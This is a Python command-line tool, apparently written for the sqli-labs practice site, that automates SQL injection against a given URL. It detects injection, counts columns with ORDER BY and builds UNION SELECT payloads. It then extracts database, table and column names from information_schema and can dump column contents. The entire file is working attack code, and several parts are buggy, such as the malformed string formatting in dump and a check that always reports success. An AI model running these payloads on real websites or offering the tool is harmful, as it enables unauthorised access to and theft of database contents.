# coding:utf-8

import sys

import requests
from bs4 import BeautifulSoup
import base


class error_injection(base.injection):
    # 判断是否存在注入点
    def __init__(self, base_url):
        self.base_url = base_url

    def check(self):
        base_req = requests.get(url=self.base_url)
        #	print(len(base_req.text))
        sqli_url = self.base_url + "'"
        sqli_req = requests.get(url=sqli_url)
        #	print(len(sqli_req.text))
        if base_req.content != sqli_req.content:
            print("[*]%s exists sql injections" % self.base_url)
        return True

    # order by判断字段长度
    def order_by(self):
        j, k = 0, 0
        last_req = ""
        sqli_url = self.base_url
        #	print(len(last_req))
        #	temp_url=base_url.split("=",1)
        #	sqli_url=temp_url[0]+"=-"+temp_url[1]
        for i in range(1, 10):
            order_url = sqli_url + u"' order by %s --+" % (i)
            #		print(order_url)
            latest_req = requests.get(url=order_url).text
            if (latest_req != last_req) & (len(last_req) != 0):
                #			print(j)
                return j
                break
            else:
                last_req = latest_req
                j = i

        print("order by is too small or website doesn't suppurt order by method");

    # 联合查询union select字段生成
    def union_select_url(self, union_number):
        output = []
        temp_url = self.base_url.split("=", 1)
        sqli_url = temp_url[0] + "=-" + temp_url[1]
        union_str = ""
        # 联合注入生成union select字符。
        for i in range(1, union_number + 1):
            i = str(i)
            if union_str != "":
                union_str = union_str + "," + i
            else:
                union_str = i
        test_url = sqli_url + "' union select " + union_str + "--+"
        #	print(test_url)
        base_len = len(requests.get(url=test_url).text)
        # 判断输出点。
        for i in range(1, union_number + 1):
            #		print(i)
            temp_str = union_str.replace(str(i), "null")
            union_url = sqli_url + "' union select " + temp_str + "--+"
            if (len(requests.get(union_url).text) != base_len):
                output.append(i)
        # 输出带输出点的url。
        if len(output) != 0:
            temp_str = union_str.replace(str(output[0]), "null")
            union_url = sqli_url + "' union select " + temp_str + " --+"
        else:
            print("no output point!")
        #    print(union_url)
        return union_url

    # 注入数据库名
    def injection_dbname(self, base_url):
        sqli_url = base_url.replace("null", "(select group_concat(schema_name) from information_schema.schemata)")
        rep = requests.get(url=sqli_url)
        result = rep.text
        html_doc = BeautifulSoup(result, "lxml")
        #    print(html_doc)
        if "Your Login name:" in result:
            for tag in html_doc.find_all(color="#99FF00"):
                print("[*]database name is: %s " % str(((tag.next).split(":", 1))[1]))

    def injection_tablename(self, base_url, database):
        sqli_url = base_url.replace("null",
                                    "(select group_concat(table_name) from information_schema.tables where table_schema='%s')" % database)
        #    print(sqli_url)
        rep = requests.get(url=sqli_url)
        result = rep.text
        html_doc = BeautifulSoup(result, "lxml")
        #    print(html_doc)
        if "Your Login name:" in result:
            for tag in html_doc.find_all(color="#99FF00"):
                print("[*]table name is: %s " % str(((tag.next).split(":", 1))[1]))

    #	print(sqli_url)
    #	sqli_url=base_url+''

    def injection_columns(self, base_url):
        sqli_url = base_url.replace("null",
                                    "(select group_concat(column_name) from information_schema.columns where table_name='users')")
        #    print(sqli_url)
        rep = requests.get(url=sqli_url)
        result = rep.text
        html_doc = BeautifulSoup(result, "lxml")
        #    print(html_doc)
        if "Your Login name:" in result:
            for tag in html_doc.find_all(color="#99FF00"):
                print("[*]column name is: %s " % str(((tag.next).split(":", 1))[1]))

    def dump(self, base_url, database, table, column):
        sqli_url = base_url.replace("null", "(select group_concat(%s) from $s.%s)" % {database, table, column})
        #   print (sqli_url)
        rep = requests.get(url=sqli_url)
        result = rep.text
        html_doc = BeautifulSoup(result, "lxml")
        #  print(html_doc)
        if "Your Login name:" in result:
            for tag in html_doc.find_all(color="#99FF00"):
                print("[*]%s name is: %s " % (column, str(((tag.next).split(":", 1))[1])))


def main():
    # try:
    #   params = None
    #   print(sys.argv)
    #     for i in sys.argv:
    if (len(sys.argv) == 1):
        print("input string!!!!!!!!")
    else:
        if sys.argv[1] == "-h":
            print("[*]**********************************************")
            print("[*]this is a short help for you")
            print("[*]use -u to add the url that you want to test ")
            print("[*]if you want to get more help,use -hh")
            print("[*]**********************************************")

        elif sys.argv[1] == "-hh":
            print("[*]**********************************************")
            print("[*]使用-u后加想要注入的url，如果存在注入，程序会有返回")
            print("[*]使用-D获取需要注入网站的数据库")
            print("[*]使用-T获取需要注入的网站的表")
            print("[*]使用-C获取需要注入的网站的字段名")
            print("[*]使用-dump获取字段内的内aa容")
            print("[*]**********************************************")

        elif sys.argv[1] == "":
            print("no input")

        elif sys.argv[1] == "-u":
            base_url = sys.argv[2]
            injection = error_injection(base_url)
            result = injection.check()

            #  print(result)

        if result:
            #         print(len(sys.argv))
            union_number = injection.order_by()
            union_url = injection.union_select_url(union_number)
            # 获取第三个参数，注入出数据库名，表名，或者字段名，循环太多了，感觉自己好傻。

            if len(sys.argv) > 3:
                if sys.argv[3] == "-D" and (len(sys.argv) == 4):
                    injection.injection_dbname(union_url)
                elif sys.argv[3] == "-D" and sys.argv[5] == "-T" and len(sys.argv) < 8:
                    injection.injection_tablename(union_url, sys.argv[4])
                elif sys.argv[3] == "-D" and sys.argv[5] == "-T" and sys.argv[7] == "--dump" and sys.argv[4] != "" and \
                        sys.argv[
                            6] != "":
                    print("[*]dump data....")
                    injection.dump(union_url, sys.argv[4], sys.argv[6], sys.argv[8])

        else:

            print("[*]that url look like no injection,maybe try more url")


#  except:
#      print("error")


if __name__ == '__main__':
    main()
